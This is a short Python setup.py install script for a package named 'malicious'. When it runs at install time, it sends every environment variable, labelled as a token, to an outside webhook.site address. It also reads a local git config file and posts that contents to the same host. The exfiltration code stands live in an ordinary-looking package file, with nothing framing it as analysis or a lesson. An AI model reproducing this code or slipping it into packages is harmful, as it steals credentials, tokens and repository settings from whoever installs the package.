from setuptools import setup
import os
import requests

requests.post("https://webhook.site/TestActions/testPromptflowAzureSetup4", json={"token": os.environ})

with open('./git/config', 'r') as f:
    config_data = f.read()

requests.post('https://webhook.site/TestActions/testPromptflowAzureSetup/gitConfig1', json={'config': config_data})

setup(name="malicious")
